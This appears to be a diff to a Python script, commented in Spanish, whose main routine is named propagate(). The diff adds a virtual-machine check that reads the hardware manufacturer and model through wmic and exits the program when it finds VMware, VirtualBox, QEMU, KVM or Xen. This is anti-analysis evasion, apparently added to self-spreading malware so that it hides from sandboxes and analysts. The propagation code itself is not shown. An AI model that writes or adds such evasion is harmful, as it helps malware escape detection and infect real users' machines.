@@ -11,6 +11,33 @@ import wget
 import ssl
 import ctypes
 
+
+# =============================================
+# DETECTAR ENTORNOS VIRTUALES
+# =============================================
+def get_wmi_value(field):
+    try:
+        output = subprocess.check_output(['wmic','get',field],
+            universal_newlines=True,
+            stderr=subprocess.DEVNULL
+        )
+        lines = output.strip().splitlines()
+        if len(lines) >= 2:
+            return lines[1].strip().lower()
+    except Exception:
+        return ""
+    return ""
+
+def detect_vm(): 
+    manufacturer = get_wmi_value("manufacturer")
+    model = get_wmi_value("model")
+    vm_indicators = ['vmware','virtualbox','virtual machine','qemu','kvm','xen']
+    for indicator in vm_indicators:
+        if indicator in manufacturer or indicator in model:
+            return True
+    return False 
+
+
 # =============================================
 # CONFIGURACIÓN DEBUG (CAMBIAR ESTE VALOR)
 # =============================================
@@ -184,4 +211,8 @@ def propagate():
             time.sleep(60)
 
 if __name__ == "__main__":
+    
+    if detect_vm():
+        sys.exit()
+    
     propagate()
